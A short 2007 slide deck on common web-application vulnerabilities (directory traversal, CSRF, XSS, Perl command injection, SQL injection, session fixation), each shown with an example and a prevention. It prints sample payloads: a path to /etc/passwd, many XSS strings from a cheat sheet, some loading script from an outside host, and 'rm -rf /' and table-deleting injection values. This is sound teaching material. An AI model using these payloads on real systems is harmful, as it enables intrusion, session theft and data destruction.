basic security issue

tokuhirom. 2007-08-13(mon)
at mobile factory Inc.
----
web applications have a too many patterns of vulnerability.
----
- CSRF
- XSS
- Directory Traversal
- and more.
----
*Directory Traversal
----
example:

- http://www.acme-hackme.com/online/getnews.asp?item=20March2003.html
- http://www.acme-hackme.com/online/getnews.asp?item=../../../../etc/passwd
----
*Cross Site Request Forgeries(CSRF)

Hot topics?
----
example.

>||
<form method="post" action="http://example.com/bye">
<input type="submit" value="YAY!" />
</form>
||<
----
User Browser has Cookies.

hmm.
----
Prevension: embed token.

>||
<form method="post" action="http://example.com/bye">
<input type="hidden" value="JLKJEKLMK@#U%R)*)DJSKFJNLSJLJL" />
<input type="submit" value="YAY!" />
</form>
||<
----
*Cross Site Scripting(XSS)
----
example:
>||
<script>alert(document.cookie);</script>
||<
----
Prevension: html escape.
>||
>>> print "<script>alert('xss');</script>"
<script>alert('xss');</script>

>>> print cgi.escape("<script>alert('xss');</script>")
&lt;script&gt;alert('xss');&lt;/script&gt;
||<
----
see XSS Cheatsheet.
http://ha.ckers.org/xss.html

hmmmm.... too many patterns.
----
for example:
>||
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
||<
----
>||
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
||<
----
>||
<IMG SRC="jav   ascript:alert('XSS');">
<IMG SRC="jav    ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS'
||<
----
>||
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
||<
----
>||
<<SCRIPT>alert("XSS");//<</SCRIPT>
<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
<SCRIPT SRC=//ha.ckers.org/.j>
<iframe src=http://ha.ckers.org/scriptlet.html <
\";alert('XSS');//
||<
----
>||
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
<IMG SRC='vbscript:msgbox("XSS")'>
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
||<
----
White list is bad selection?
----
*XSS by Images.
----
<img src="http://www.tokumaru.org/d/images/20070717_0.png" />
<a href="http://www.tokumaru.org/d/images/20070717_0.png">XSS Image</a>
----
IE6 auto guess the file type.
----
Prevension: mod_imagefight(alpha quality)
insert
>||
<plaintext style=display:none>
||<
tag.
----
*Perl open
----
>||
open FILE, $r->param('path');
||<

http://example.com/?path=|rm -rf /
----
*Command line injection
----
examples.
>||
my $file = $r->param('path');
system "cat $file";
||<

http://example.com/?path=;rm -rf /
----
Prevension:
>||
system 'cat', $file;
||<
----
Perl::Critic can detect this vulnerability.
----
*SQL Injection
----
>||
my $id = $r->param('id');
my ($user,) = do_sql("SELECT * FROM user WHERE id=$id LIMIT 1");
||<
http://example.com/?id=1;DELETE FROM user;SELECT * FROM user WHERE id=
----
Prevension: use prepared statement
>||
my $id = $r->param('id');
my ($user,) = do_sql("SELECT * FROM user WHERE id=? LIMIT 1", $id);
||<
----
*Session Fixation
----
send sid to target user.
>||
http://example.com/?sid=FOOOBARRR
||<
----
target user logged in.
----
then attacker can spoofing.
----
Prevension: regenerate session id when login.
----
any questions?
